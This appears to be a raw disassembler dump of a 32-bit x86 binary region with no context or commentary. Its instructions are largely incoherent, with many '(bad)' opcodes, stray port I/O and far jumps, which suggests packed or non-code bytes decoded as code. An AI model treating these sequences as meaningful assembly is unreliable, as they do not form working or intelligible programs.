  4148d6:	sbb    edx,edx
  4148d8:	dec    esi
  4148d9:	jmp    0x820:0xe64acf1c
  4148e0:	pop    ecx
  4148e1:	in     eax,0x20
  4148e3:	or     BYTE PTR [esi-0x1c],dl
  4148e6:	and    cl,BYTE PTR ds:0x0
	...
  414900:	add    BYTE PTR [ebp-0x20],cl
  414903:	add    DWORD PTR es:[eax],ebx
  414906:	fisub  WORD PTR [edi]
  414908:	adc    DWORD PTR [eax-0x23],edx
  41490b:	sub    BYTE PTR [ebx],dl
  41490d:	dec    edi
  41490e:	fisubr DWORD PTR [edi+eax*1]
  414911:	popa   
  414912:	mov    ebp,0xbd58a048
  414917:	dec    eax
  414918:	mov    al,0x32
  41491a:	xlat   BYTE PTR ds:[ebx]
  41491b:	dec    eax
  41491c:	fldenv [eax]
  41491e:	aam    0x32
  414920:	(bad)  [ebx]
  414922:	shl    BYTE PTR [edi+edx*8],cl
  414925:	sbb    al,0xd0
  414927:	add    BYTE PTR ss:[ebp-0x4bc4c7c8],dh
  41492e:	cmp    edi,DWORD PTR [ecx]
  414930:	dec    ecx
  414931:	xchg   esp,eax
  414932:	dec    eax
  414933:	inc    edi
  414934:	dec    ecx
  414935:	mov    DWORD PTR [esp+edi*1],esi
  414938:	aas    
  414939:	sbb    eax,0x11434042
  41493e:	ds inc esp
  414940:	add    BYTE PTR [edx],dl
  414942:	dec    ecx
  414943:	mov    fs,esp
  414945:	popf   
  414946:	inc    eax
  414947:	(bad)  
  414948:	pop    ds
  414949:	ins    BYTE PTR es:[edi],dx
  41494a:	inc    eax
  41494b:	(bad)  
  41494c:	pop    ebx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	inc    eax
  41494f:	(bad)  
  414950:	xchg   edi,eax
  414951:	pop    esp
  414952:	inc    eax
  414953:	(bad)  
  414954:	rcr    BYTE PTR [eax+eax*2-0x2],1
  414958:	add    eax,0xe7fe406f
  41495d:	jnp    0x41499f
  41495f:	(bad)  
  414960:	pop    ebp
  414961:	jp     0x4149a3
  414963:	(bad)  
  414964:	pop    ebp
	...
  41497d:	add    dl,bh
  41497f:	inc    eax
  414980:	(bad)  
  414981:	fdivr  DWORD PTR [edx+0x40]
  414984:	(bad)  
  414985:	fsubr  st,st(2)
  414987:	inc    eax
  414988:	(bad)  
  414989:	jno    0x414a05
  41498b:	inc    eax
  41498c:	(bad)  
  41498d:	rcr    edx,cl
  41498f:	inc    eax
  414990:	(bad)  
  414991:	sbb    ebp,DWORD PTR [ebp-0x52a401c0]
  414997:	inc    eax
  414998:	(bad)  
  414999:	lahf   
  41499a:	popf   
  41499b:	inc    eax
  41499c:	(bad)  
  41499d:	mov    eax,gs:0xf197fe40
  4149a3:	inc    eax
  4149a4:	dec    cl
  4149a6:	loope  0x4149e8
  4149a8:	(bad)  
  4149a9:	sti    
  4149aa:	loope  0x4149ec
  4149ac:	(bad)  
  4149ad:	sub    eax,0x5ffe40e0
  4149b2:	lock inc eax
  4149b4:	(bad)  
  4149b5:	out    dx,ax
  4149b7:	inc    eax
  4149b8:	(bad)  
  4149b9:	mov    esp,0xffc3e9f4
  4149be:	cmp    cl,ch
  4149c0:	ret    
  4149c1:	dec    esp
  4149c3:	or     eax,esp
  4149c5:	dec    esp
  4149c7:	add    eax,edx
  4149c9:	jmp    FWORD PTR [eax]
  4149cb:	inc    ecx
  4149cd:	jmp    DWORD PTR [ebp-0x4d003e01]
  4149d3:	ffreep st(1)
  4149d5:	call   DWORD PTR [ecx]
  4149d7:	fcmovb st,st(1)
  4149d9:	jmp    DWORD PTR [eax]
  4149db:	loop   0x41499e
  4149dd:	jmp    esi
  4149df:	in     al,dx
  4149e0:	ret    0xff
	...
  4149fb:	paddsw mm0,mm2
  4149fe:	call   eax
  414a00:	in     al,dx
  414a01:	ret    0xd1ff
  414a04:	in     al,dx
  414a05:	ret    0xe2ff
  414a08:	in     al,dx
  414a09:	ret    0xd3ff
  414a0c:	in     al,dx
  414a0d:	ret    0x38ff
  414a10:	in     eax,dx
  414a11:	ret    0x30ff
  414a14:	in     eax,dx
  414a15:	ret    0x28ff
  414a18:	in     eax,dx
  414a19:	ret    0x4cff
  414a1c:	mov    eax,ecx
  414a1e:	dec    DWORD PTR [ebx+eax*4-0x3f]
  414a22:	call   eax
  414a24:	in     eax,dx
  414a25:	ret    0x9cff
  414a28:	out    dx,al
  414a29:	ret    0x25ff
  414a2c:	out    dx,al
  414a2d:	ret    0x5cff
  414a30:	out    dx,al
  414a31:	ret    0x41ff
  414a34:	out    dx,al
  414a35:	ret    0xa0ff
  414a38:	sbb    ax,0x2080
  414a3c:	add    al,BYTE PTR [ebx]
  414a3e:	add    ah,dh
  414a40:	outs   dx,BYTE PTR ds:[esi]
  414a41:	mov    esi,0xbe6f23f3
  414a46:	out    dx,eax
  414a47:	sbb    ebp,DWORD PTR [edi-0x42]
  414a4a:	retf   
  414a4b:	adc    eax,DWORD PTR ds:0xca878ba
  414a51:	mov    ch,0xd0
  414a53:	and    eax,0x680b625c
  414a58:	dec    eax
  414a59:	push   cs
  414a5a:	jp     0x414aa4
  414a5c:	in     eax,0x70
  414a5e:	mov    dh,0x0
	...
  414a78:	mov    bl,0x8d
  414a7a:	xchg   esp,eax
  414a7b:	das    
  414a7c:	ins    BYTE PTR es:[edi],dx
  414a7d:	popa   
  414a7e:	repz jns 0x414ac1
  414a81:	in     eax,dx
  414a82:	pusha  
  414a83:	mov    bl,0x8f
  414a86:	fmulp  st(7),st
  414a88:	int    0x13
  414a8a:	arpl   ax,sp
  414a8c:	cli    
  414a8d:	add    al,0xe7
  414a8f:	into   
  414a90:	popf   
  414a91:	adc    esp,DWORD PTR [ebx-0x18]
  414a94:	cli    
  414a95:	add    al,0xe7
  414a97:	int3   
  414a98:	inc    eax
  414a99:	adc    eax,0x59dcfd34
  414a9e:	(bad)  
  414aa0:	push   0x12
  414aa2:	out    0x3,al
  414aa4:	hlt    
  414aa5:	cmp    eax,0xc08f03c
  414aaa:	adc    DWORD PTR ds:0x3ee088c,edx
  414ab0:	hlt    
  414ab1:	adc    edx,DWORD PTR [esi-0x3d]
  414ab4:	or     ecx,DWORD PTR [eax]
  414ab6:	scas   al,BYTE PTR es:[edi]
  414ab7:	jge    0x414b29
  414ab9:	push   esp
  414aba:	jle    0x414ac7
  414abc:	bound  edx,QWORD PTR [ebx]
  414abe:	ds ret 
  414ac0:	dec    DWORD PTR [ebp+0x352bc64]
  414ac6:	addr16 sti 
  414ac8:	or     BYTE PTR [ebx+0x1],0x7d
  414acc:	js     0x414b1e
  414ace:	push   esi
  414acf:	or     edi,DWORD PTR [edx]
  414ad1:	mov    esp,0x502c5a7
  414ad6:	jo     0x414a59
  414ad8:	fild   WORD PTR [ebx]
  414ada:	aas    
  414adb:	or     eax,DWORD PTR [eax]
	...
  414af5:	ins    BYTE PTR es:[edi],dx
  414af6:	mov    DWORD PTR [eax],eax
  414af8:	stc    
  414af9:	out    dx,al
  414afa:	add    bh,dh
  414afc:	bound  esi,QWORD PTR [edi]
  414afe:	and    eax,DWORD PTR [edi+0x438cb7bc]
  414b04:	and    DWORD PTR [ebx],esi
  414b06:	lds    esi,FWORD PTR [ebx-0x12]
  414b09:	mov    dh,0x48
  414b0b:	clc    
  414b0c:	xor    DWORD PTR [esi-0x4097ffbe],ecx
  414b12:	dec    ecx
  414b13:	push   edx
  414b14:	stos   BYTE PTR es:[edi],al
  414b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b16:	jbe    0x414b3e
  414b18:	fs jne 0x414ae9
  414b1b:	(bad)  
  414b1c:	out    dx,al
  414b1d:	(bad)  
  414b1e:	push   ecx
  414b1f:	push   0xffffffe9
  414b21:	dec    esp
  414b22:	mov    eax,edi
  414b24:	fucomip st,st(6)
  414b26:	add    dl,BYTE PTR [ecx+0x62]
  414b29:	ss jmp 0xb98a:0x2fe6c0a
  414b31:	je     0x414b2b
  414b33:	jae    0x414b1b
  414b35:	cmp    esi,0x4f55ae7
  414b3b:	add    dl,bh
  414b3d:	leave  
  414b3e:	mov    es,WORD PTR [esi-0xf]
  414b41:	or     cl,dl
  414b43:	mov    edi,0xe7c58991
  414b48:	in     eax,dx
  414b49:	jb     0x414b2d
  414b4b:	jmp    FWORD PTR [ecx+0x18]
  414b4e:	add    eax,0x13242c87
  414b53:	mov    ch,0x27
  414b55:	push   edx
  414b56:	lea    ecx,[ebx-0x6f]
	...
  414b71:	add    BYTE PTR [esi-0x45],bl
  414b74:	dec    esi
  414b75:	fnstsw WORD PTR [eax+0x106a01ec]
  414b7b:	add    eax,0x3236c87
  414b80:	(bad)  
  414b81:	push   esi
  414b82:	ds mov ebx,0xb32eed4e
  414b88:	enter  0x2200,0x57
  414b8c:	inc    ebx
  414b8d:	sbb    BYTE PTR [esp+ebp*4-0x57ffc73],ah
  414b94:	add    cl,bh
  414b96:	push   ds
  414b97:	dec    ecx
  414b98:	mov    BYTE PTR [ebp-0x7f],al
  414b9b:	adc    BYTE PTR [eax+esi*4-0x7c],0xac
  414ba0:	xchg   ecx,eax
  414ba1:	mov    ecx,DWORD PTR [ebx-0x2]
  414ba4:	shr    al,0xd8
  414ba7:	fcmove st,st(0)
  414ba9:	inc    ecx
  414baa:	mov    esi,0x75858848
  414baf:	push   cs
  414bb0:	(bad)  
  414bb1:	call   DWORD PTR [esi-0x3c]
  414bb4:	add    eax,0x2302f5c1
  414bb9:	rol    DWORD PTR [edx+eax*8-0x1f],0x89
  414bbe:	pop    eax
  414bbf:	popf   
  414bc0:	(bad)  
  414bc1:	jmp    DWORD PTR [edx+0x5c08437f]
  414bc7:	and    BYTE PTR [ebx+eiz*1],bl
  414bca:	pop    esp
  414bcb:	jge    0x414b51
  414bcd:	je     0x414c31
  414bcf:	or     edi,esi
  414bd1:	mov    ecx,ebx
  414bd3:	add    cl,al
  414bd5:	call   0x414bda
	...
  414bee:	add    BYTE PTR [eax+ebp*8-0x66e77640],ah
  414bf5:	(bad)  
  414bf6:	jmp    DWORD PTR [edx+0x7f]
  414bf9:	inc    esp
  414bfa:	clc    
  414bfb:	adc    al,0x82
  414bfd:	push   ebp
  414bfe:	inc    DWORD PTR [edx+0x5e40040b]
  414c04:	add    eax,0xa4c88900
  414c09:	(bad)  
  414c0a:	jmp    edx
  414c0c:	jge    0x414ba2
  414c0e:	push   0x89fe0be2
  414c13:	enter  0xfe8c,0xff
  414c17:	mov    ds:0xf480547d,al
  414c1c:	lods   eax,DWORD PTR fs:[esi]
  414c1e:	mov    ds:0x887db87d,eax
  414c23:	shr    DWORD PTR [edi],0x79
  414c26:	push   esp
  414c27:	pusha  
  414c28:	je     0x414ca7
  414c2a:	pop    ebx
  414c2b:	sbb    edi,DWORD PTR [edx]
  414c2d:	pop    es
  414c2e:	mov    bh,BYTE PTR [edx-0x7a3851d]
  414c34:	push   esp
  414c35:	add    al,0x0
  414c37:	je     0x414c25
  414c39:	lea    ecx,[ecx]
  414c3b:	xor    eax,0xb522ef03
  414c40:	gs mov ebp,0x7aebdf87
  414c46:	push   esp
  414c47:	ins    BYTE PTR es:[edi],dx
  414c48:	jae    0x414c0c
  414c4a:	pop    es
  414c4b:	adc    esi,ebp
  414c4d:	add    DWORD PTR [eax-0xc],esi
  414c50:	add    DWORD PTR [ebx],0x5f
	...
  414c6b:	add    BYTE PTR [eax+0x50],al
  414c6e:	(bad)  
  414c71:	inc    BYTE PTR [ecx]
  414c73:	je     0x414c9c
  414c75:	sbb    DWORD PTR [eax+eax*1],eax
  414c78:	aam    0xed
  414c7a:	lea    eax,[esi-0x17]
  414c7d:	in     eax,dx
  414c7e:	add    DWORD PTR [eax],esi
  414c80:	hlt    
  414c81:	cmp    ebp,ebp
  414c83:	cmp    al,0xf4
  414c85:	in     eax,dx
  414c86:	sar    edi,0x7
  414c89:	and    al,0xc5
  414c8b:	dec    DWORD PTR [ebx-0x408bfbc2]
  414c91:	adc    ebx,DWORD PTR [ecx]
  414c93:	call   0x433e08
  414c98:	lods   al,BYTE PTR ds:[esi]
  414c99:	in     al,0xf6
  414c9b:	jmp    FWORD PTR [ebx+0x75]
  414c9e:	outs   dx,BYTE PTR ds:[esi]
  414c9f:	aas    
  414ca0:	arpl   WORD PTR [edi+0x8],di
  414ca3:	cmp    al,0x5b
  414ca5:	out    dx,al
  414ca6:	add    DWORD PTR [eax],eax
  414ca8:	sar    BYTE PTR [ebx+0x535c77c],cl
  414cae:	pusha  
  414caf:	sti    
  414cb0:	ins    BYTE PTR es:[edi],dx
  414cb1:	ret    0x8a3
  414cb4:	cmp    al,BYTE PTR [eax]
  414cb6:	pusha  
  414cb7:	jbe    0x414c80
  414cb9:	dec    DWORD PTR [esi+0x8]
  414cbc:	jae    0x414c48
  414cbe:	pushf  
  414cbf:	or     BYTE PTR [edx],ah
  414cc1:	add    BYTE PTR [ebx-0x22],dl
  414cc4:	lea    ecx,[edx]
  414cc6:	(bad)  
  414cc7:	sbb    al,0x28
  414cc9:	imul   ebx,esp,0x1c
  414ccc:	or     al,0x8e
  414cce:	fs ret 
	...
  414ce8:	add    BYTE PTR [edx],al
  414cea:	add    BYTE PTR [edi],bl
  414cec:	sbb    al,0xe7
  414cee:	lea    esp,[ebx+eax*8-0xe]
  414cf2:	dec    DWORD PTR [esi]
  414cf4:	sbb    al,0xff
  414cf6:	lea    esi,[edi+edi*4-0x1e]
  414cfa:	(bad)  
  414cfb:	(bad)  
  414cfc:	jp     0x414d6e
  414cfe:	pop    eax
  414cff:	test   BYTE PTR [edi],0xd2
  414d02:	mov    esp,DWORD PTR [ebp-0x47e8105]
  414d08:	and    BYTE PTR [ebx-0x247e8ff9],0xff
  414d0f:	(bad)  
  414d10:	pop    es
  414d11:	jle    0x414cda
  414d13:	jo     0x414caf
  414d15:	neg    BYTE PTR [ebp-0x42]
  414d18:	or     eax,0xf225b7f2
  414d1d:	into   
  414d1e:	cli    
  414d1f:	dec    ebp
  414d20:	adc    DWORD PTR [ebx+0x78],0x8bb37af2
  414d27:	scas   al,BYTE PTR es:[edi]
  414d28:	call   0x3b7e:0xf429df6
  414d2f:	lahf   
  414d30:	mov    BYTE PTR [eax],ah
  414d32:	xchg   edx,eax
  414d33:	adc    BYTE PTR ds:0x7aeaffdf,al
  414d39:	xor    al,ch
  414d3b:	mov    BYTE PTR [edx],al
  414d3d:	pop    ebx
  414d3e:	sbb    DWORD PTR [eax],eax
  414d40:	sbb    DWORD PTR [ebx],edx
  414d42:	inc    ebx
  414d43:	add    BYTE PTR [edx+0x18],ah
  414d46:	lea    ebx,[ebx-0x20104e3]
  414d4c:	add    BYTE PTR fs:[eax],al
	...
  414d63:	add    BYTE PTR [eax],al
  414d65:	add    BYTE PTR [edi],cl
  414d67:	jns    0x414d6e
  414d69:	ret    
  414d6a:	std    
  414d6b:	in     al,dx
  414d6c:	loopne 0x414d53
  414d6e:	test   DWORD PTR [eax*8+0x4d7ac],0x9ebf7e9
  414d79:	bound  esi,QWORD PTR ds:0x2464870f
  414d7f:	(bad)  
  414d80:	std    
  414d81:	es jg  0x414d5b
  414d84:	mov    esp,ebp
  414d86:	xor    bl,BYTE PTR [edx+ebp*2-0x8085f16]
  414d8d:	push   0x55
  414d8f:	pop    esi
  414d90:	std    
  414d91:	push   es
  414d92:	sti    
  414d93:	std    
  414d94:	sub    BYTE PTR [ebx+eax*2-0x3fcb7801],0xff
  414d9c:	std    
  414d9d:	out    dx,al
  414d9e:	dec    eax
  414d9f:	mov    DWORD PTR [esi+eiz*8],edi
  414da2:	cli    
  414da3:	dec    BYTE PTR ds:0x8b0e7996
  414da9:	sub    eax,0x248702f8
  414dae:	or     al,0x3b
  414db0:	inc    ebx
  414db1:	fnstsw WORD PTR [ecx+0x3]
  414db4:	xchg   DWORD PTR [esp+edi*8],edi
  414db7:	mov    cl,bl
  414db9:	cmp    eax,0xbd438bae
  414dbe:	sbb    BYTE PTR [ebx],ch
  414dc0:	ret    0xc5da
  414dc3:	aam    0xf8
  414dc5:	sub    edi,ebp
  414dc7:	or     DWORD PTR [ecx+0xc2],edi
	...
  414de1:	add    BYTE PTR [eax],al
  414de3:	daa    
  414de4:	xchg   ecx,eax
  414de5:	add    al,0x78
  414de7:	jbe    0x414dd6
  414de9:	add    al,0x0
  414deb:	cmp    ch,BYTE PTR ss:[edi+0x10]
  414def:	into   
  414df0:	add    bh,bh
  414df2:	xor    DWORD PTR [esi+edi*8+0x3a],0xffffffc8
  414df7:	dec    esi
  414df8:	adc    BYTE PTR [edx-0x1fa1e63],cl
  414dfe:	dec    esi
  414e00:	mov    ebp,ss
  414e02:	add    BYTE PTR [eax-0x23],dl
  414e05:	repz inc esi
  414e07:	dec    ecx
  414e08:	add    al,0x74
  414e0a:	daa    
  414e0b:	sub    cl,BYTE PTR [edi+0x43]
  414e0e:	adc    al,0xa6
  414e10:	cmp    DWORD PTR [eax+0x1cae1],eax
  414e16:	add    ah,bl
  414e18:	sbb    DWORD PTR ds:0x8708ed83,eax
  414e1e:	dec    ebp
  414e1f:	loope  0x414da1
  414e21:	inc    esp
  414e22:	enter  0xfc91,0x8a
  414e26:	test   DWORD PTR [ebp-0x150001fa],esp
  414e2c:	dec    edi
  414e2d:	add    DWORD PTR [eax],ecx
  414e2f:	vpsadbw xmm4,xmm1,XMMWORD PTR fs:[ebx-0x4c8bfe0b]
  414e38:	div    BYTE PTR [esi-0x3a833cba]
  414e3e:	shl    DWORD PTR [ebp-0x351e7f00],0x8
	...
  414e5d:	add    BYTE PTR [eax],al
  414e5f:	add    BYTE PTR [esi],bl
  414e61:	sub    DWORD PTR [eax],eax
  414e63:	mov    eax,edx
  414e65:	sub    al,0x8a
  414e67:	inc    ebp
  414e68:	mov    ch,0xf7
  414e6a:	mov    bl,0x84
  414e6c:	xchg   ebp,eax
  414e6d:	add    edi,edi
  414e6f:	call   FWORD PTR [ebp+0x4f04c7a]
  414e75:	mov    esi,0xfcd08bc9
  414e7a:	mov    dl,BYTE PTR [ebp-0xc]
  414e7d:	xchg   edi,eax
  414e7e:	jns    0x414ec4
  414e80:	ins    BYTE PTR es:[edi],dx
  414e81:	push   0x72fc7327
  414e86:	mov    ebp,0x80ef69eb
  414e8b:	cmp    ch,BYTE PTR ds:0x3f2af3fa
  414e91:	and    al,0x41
  414e93:	call   0xc7c1fb8e
  414e98:	cmp    esi,DWORD PTR [edx+0x7]
  414e9b:	repnz pop edi
  414e9d:	push   0xffffff85
  414e9f:	shl    esp,cl
  414ea1:	xlat   BYTE PTR ds:[ebx]
  414ea2:	fwait
  414ea3:	mov    bl,BYTE PTR [esi]
  414ea5:	add    ch,BYTE PTR [ebp-0x7f60586d]
  414eab:	mov    esp,0xfe0336b4
  414eb0:	hlt    
  414eb1:	mov    bh,0xdf
  414eb3:	dec    BYTE PTR [ecx+0x604c770f]
  414eb9:	push   ds
  414eba:	dec    ebp
  414ebb:	aas    
  414ebc:	repz adc eax,DWORD PTR [ebx]
  414ebf:	mov    WORD PTR [ecx+0xfe04a2],es
	...
  414edd:	jecxz  0x414f56
  414edf:	cmp    esp,edi
  414ee1:	push   edi
  414ee2:	aam    0x1
  414ee4:	add    BYTE PTR [edi-0x67],bh
  414ee7:	add    eax,0xd071b484
  414eec:	jmp    0x610f:0x93be770f
  414ef3:	mov    ebp,0xc8d3b3fe
  414ef8:	mul    DWORD PTR [ebx]
  414efa:	in     al,dx
  414efb:	ja     0x414f03
  414efd:	fisubr WORD PTR [eax-0x53]
  414f00:	(bad)  
  414f01:	fwait
  414f02:	mov    ebx,0x7177138e
  414f07:	mov    ebp,0x2ab8bfe
  414f0c:	je     0x414ef3
  414f0e:	add    al,0x71
  414f10:	mov    esp,0xae643ef4
  414f15:	jb     0x414f13
  414f17:	xchg   esi,eax
  414f18:	(bad)  
  414f19:	icebp  
  414f1a:	inc    ebx
  414f1b:	rol    BYTE PTR [esi+0x7a4b7787],cl
  414f21:	fmul   DWORD PTR [eax]
  414f23:	mov    edx,0x7b420c43
  414f28:	xchg   DWORD PTR [eax-0x38c3dbc3],esi
  414f2e:	xor    dl,BYTE PTR [edx-0x17]
  414f31:	jmp    0x565d:0x8078e9b2
  414f38:	add    al,0x2a
  414f3a:	or     al,0x95
  414f3c:	(bad)  
  414f3d:	sti    
  414f3e:	aas    
  414f3f:	lods   al,BYTE PTR ds:[esi]
  414f40:	sldt   WORD PTR [eax]
	...
  414f57:	add    BYTE PTR [eax],al
  414f59:	add    dl,ch
  414f5b:	sub    BYTE PTR [ebx],0x3
  414f5e:	hlt    
  414f5f:	add    al,0xa9
  414f61:	jp     0x414f03
  414f63:	clc    
  414f64:	repnz scas al,BYTE PTR es:[edi]
  414f66:	out    dx,eax
  414f67:	jbe    0x414f71
  414f69:	sbb    bh,BYTE PTR [ecx]
  414f6b:	add    eax,0xb30303e7
  414f70:	jmp    0xdf32803d
  414f75:	jg     0x414f1c
  414f77:	add    al,0xe7
  414f79:	add    esi,DWORD PTR [esi]
  414f7b:	mov    ss,WORD PTR [edi+eax*1-0x6e1cadf2]
  414f82:	fsubp  st(5),st
  414f84:	inc    ebx
  414f85:	add    esi,esp
  414f87:	add    al,0x20
  414f89:	mov    DWORD PTR [eax],edx
  414f8b:	cld    
  414f8c:	fiadd  WORD PTR [ebx]
  414f8e:	add    al,BYTE PTR [ecx+0x4f4046f]
  414f94:	adc    bl,BYTE PTR [ecx-0x7c]
  414f97:	or     ebp,DWORD PTR [ebp-0x6d]
  414f9a:	hlt    
  414f9b:	add    al,0xe7
  414f9d:	out    dx,al
  414f9e:	push   ss
  414f9f:	mov    BYTE PTR [eax],al
  414fa1:	je     0x414fd3
  414fa3:	cli    
  414fa4:	std    
  414fa5:	scas   al,BYTE PTR es:[edi]
  414fa6:	clc    
  414fa7:	jo     0x414fd1
  414fa9:	loop   0x414fc7
  414fab:	xchg   ebp,eax
  414fac:	jbe    0x414fe7
  414fae:	div    DWORD PTR [eax-0x1c]
  414fb1:	bound  edi,QWORD PTR [ebp-0x77eb0208]
  414fb7:	(bad)  
  414fb8:	xchg   ebx,eax
  414fb9:	sub    eax,0x7efdfaf7
	...
  414fd6:	add    BYTE PTR [ebp-0x88902bc],cl
  414fdc:	in     eax,dx
  414fdd:	adc    edx,edi
  414fdf:	test   DWORD PTR [ecx+ecx*4],0xc0873bbc
  414fe6:	aam    0xef
  414fe8:	in     eax,dx
  414fe9:	sub    esp,DWORD PTR [edx+0x35]
  414fec:	inc    eax
  414fed:	std    
  414fee:	dec    esi
  414fef:	test   DWORD PTR [esi-0x3e0ca6bd],0x1a8a1939
  414ff9:	mov    ah,BYTE PTR [esp+ebp*4-0x7]
  414ffd:	std    
  414ffe:	cs jae 0x414fc7
  415001:	sub    DWORD PTR [esi],ebp
  415003:	mov    eax,0x7af9730c
  415008:	clc    
  415009:	call   FWORD PTR [ebx+eax*1-0x94b7471]
  415010:	cli    
  415011:	std    
  415012:	shr    DWORD PTR [edi],0xfa
  415015:	jno    0x415007
  415017:	cmp    DWORD PTR [edx+0x560af553],eax
  41501d:	or     al,0x7b
  41501f:	pusha  
  415020:	test   DWORD PTR [edx-0x1a],edi
  415023:	in     al,0x75
  415025:	and    BYTE PTR [edx-0x4c],ch
  415028:	inc    ebp
  415029:	std    
  41502a:	(bad)  
  41502b:	test   BYTE PTR [esp+esi*2],0xe0
  41502f:	jp     0x414fef
  415031:	inc    eax
  415032:	add    BYTE PTR [edx-0x37fd01f9],dh
  415038:	push   ss
  415039:	aaa    
  41503a:	push   ebp
	...
  415053:	add    BYTE PTR [ecx-0x787ffa8d],dl
  415059:	or     BYTE PTR [ecx+0x4],dh
  41505c:	iret   
  41505d:	xchg   DWORD PTR [ecx-0x4],edx
  415060:	out    0x84,al
  415062:	clc    
  415063:	xor    edx,DWORD PTR [ecx+ecx*4+0x55440c79]
  41506a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41506b:	jne    0x41505b
  41506d:	aaa    
  41506e:	dec    ecx
  41506f:	lock push ecx
  415071:	fs xchg edi,eax
  415074:	sar    BYTE PTR ss:[ecx],0xe8
  415078:	dec    esi
  415079:	push   es
  41507a:	add    BYTE PTR [ebp+0x7e],bh
  41507d:	xor    eax,eax
  41507f:	cmp    DWORD PTR [eax-0xe],esp
  415082:	or     ebx,DWORD PTR [ebp+0x3bc202dd]
  415088:	pop    eax
  415089:	(bad)  
  41508a:	jbe    0x4150d0
  41508c:	hlt    
  41508d:	push   ebx
  41508e:	fdiv   QWORD PTR [ecx+esi*1+0x3b]
  415092:	ret    
  415093:	setle  BYTE PTR [eax-0x3]
  415097:	dec    DWORD PTR ds:0x4d08b617
  41509d:	cmp    ecx,DWORD PTR [ecx-0x10]
  4150a0:	mov    DWORD PTR [edi],ebx
  4150a2:	aaa    
  4150a3:	dec    ebp
  4150a4:	adc    DWORD PTR [edx+0x19],esi
  4150a7:	cmp    ebx,DWORD PTR [edx]
  4150a9:	jo     0x415099
  4150ab:	jmp    0x415082
  4150ad:	cmp    al,bl
  4150af:	divps  xmm3,XMMWORD PTR [ebp-0x3]
  4150b3:	(bad)  
  4150b4:	fst    QWORD PTR [esi]
  4150b6:	mov    dh,0x8
	...
  4150d0:	add    BYTE PTR [ebp+0x19f0493a],cl
  4150d6:	getsec 
  4150d8:	(bad)  
  4150d9:	dec    edi
  4150da:	lock out 0x1,eax
  4150dd:	hlt    
  4150de:	and    edi,DWORD PTR [ebx]
  4150e0:	(bad)
  4150e3:	cmp    eax,0x8aeb9bff
  4150e8:	inc    ebx
  4150e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ea:	jbe    0x415169
  4150ec:	cld    
  4150ed:	jg     0x415107
  4150ef:	nop
  4150f0:	xor    DWORD PTR [ebx+ebx*1+0x587b5054],esi
  4150f7:	and    al,0xfd
  4150f9:	jae    0x415095
  4150fb:	lea    ecx,[ebx-0x2006ce4]
  415101:	lds    eax,FWORD PTR ds:0x76c35006
  415107:	iret   
  415108:	xchg   ecx,edx
  41510a:	arpl   WORD PTR [ecx-0x7a9b6b85],cx
  415110:	sub    BYTE PTR [ebx+0x6a],al
  415113:	(bad)  
  415114:	call   0xfe4082f5
  415119:	out    0x34,eax
  41511b:	mov    ebx,eax
  41511d:	in     eax,dx
  41511e:	mov    al,ds:0x14ef7485
  415123:	dec    ebp
  415124:	call   0x43ce3aca
  415129:	push   esp
  41512a:	je     0x415171
  41512c:	call   0xfc5f87a6
  415131:	add    ebp,DWORD PTR [edx]
  415133:	je     0x415139
	...
  41514d:	add    BYTE PTR [ebx],cl
  41514f:	jmp    0x415152
  415151:	add    BYTE PTR [ebp+0x23],dh
  415154:	sbb    edi,esp
  415156:	jmp    0x415167
  415158:	js     0x415177
  41515a:	pushf  
  41515b:	jmp    0x74d9:0xc3dbfdfd
  415162:	es out 0x8f,eax
  415165:	(bad)  
  415167:	in     eax,dx
  415168:	add    DWORD PTR [edi-0x41],edi
  41516b:	enter  0xfdfd,0xbb
  41516f:	add    eax,0xdded0c65
  415174:	out    dx,al
  415175:	xchg   BYTE PTR [esi+0x6d03e705],bh
  41517b:	jp     0x415148
  41517d:	dec    eax
  41517e:	in     eax,0xdb
  415180:	add    BYTE PTR [edi-0x58],bl
  415183:	jno    0x4151d5
  415185:	lea    esi,[edi]
  415187:	stc    
  415188:	lock sahf 
  41518a:	xor    al,0xf8
  41518c:	scas   al,BYTE PTR es:[edi]
  41518d:	add    BYTE PTR [ecx],al
  41518f:	xor    eax,0x748846e2
  415194:	inc    eax
  415195:	add    eax,esp
  415197:	loopne 0x4151fb
  415199:	dec    esi
  41519a:	mov    al,bh
  41519c:	push   esp
  41519d:	inc    ebx
  41519e:	pop    ecx
  41519f:	clc    
  4151a0:	xchg   BYTE PTR [esi+0x7e4167],cl
  4151a6:	dec    edx
  4151a7:	in     eax,dx
  4151a8:	aad    0x17
  4151aa:	hlt    
  4151ab:	add    al,0x64
  4151ad:	ret    
  4151ae:	jmp    0x44d834
	...
  4151cb:	hlt    
  4151cc:	add    al,0x52
  4151ce:	cmp    esp,ebx
  4151d0:	jns    0x415241
  4151d2:	ja     0x415235
  4151d4:	mov    esp,cs
  4151d6:	fwait
  4151d7:	or     eax,0x684e72b7
  4151dc:	sub    al,0x6c
  4151de:	inc    edi
  4151df:	or     eax,edi
  4151e1:	ss cmp al,0x43
  4151e4:	jo     0x4151ee
  4151e6:	mov    gs,WORD PTR [edi+0x51]
  4151e9:	es add dl,dh
  4151ec:	cmp    al,0xef
  4151ee:	jbe    0x4151f1
  4151f0:	test   BYTE PTR [edi+eax*2-0x1f],dl
  4151f4:	test   DWORD PTR [esi],0x71746002
  4151fa:	xchg   BYTE PTR [edi],ah
  4151fc:	clc    
  4151fd:	(bad)  
  4151fe:	(bad)  
  4151ff:	jge    0x41524a
  415201:	add    ch,dh
  415203:	(bad)  
  415204:	aaa    
  415205:	push   DWORD PTR [edx+edx*2-0x80]
  415209:	jnp    0x4151f0
  41520b:	icebp  
  41520c:	pop    ebx
  41520d:	fcom   DWORD PTR [ebp+edx*1+0x3e]
  415211:	jnp    0x4151e4
  415213:	sub    ebx,DWORD PTR [ebp-0x80]
  415216:	dec    esi
  415217:	fwait
  415218:	or     esi,DWORD PTR [ebx+0x16]
  41521b:	iret   
  41521c:	jnp    0x415216
  41521e:	cmp    bl,dh
  415220:	test   BYTE PTR ds:0xf623fce3,bh
  415226:	daa    
  415227:	in     al,0x24
  415229:	jae    0x415231
  41522b:	ja     0x4151e8
  41522d:	inc    eax
  41522e:	sahf   
	...
  415247:	add    BYTE PTR [ebx-0x7],ch
  41524a:	call   FWORD PTR [esi+eax*1]
  41524d:	xchg   BYTE PTR [ebx-0x206a4d7],bh
  415253:	jmp    0x415220
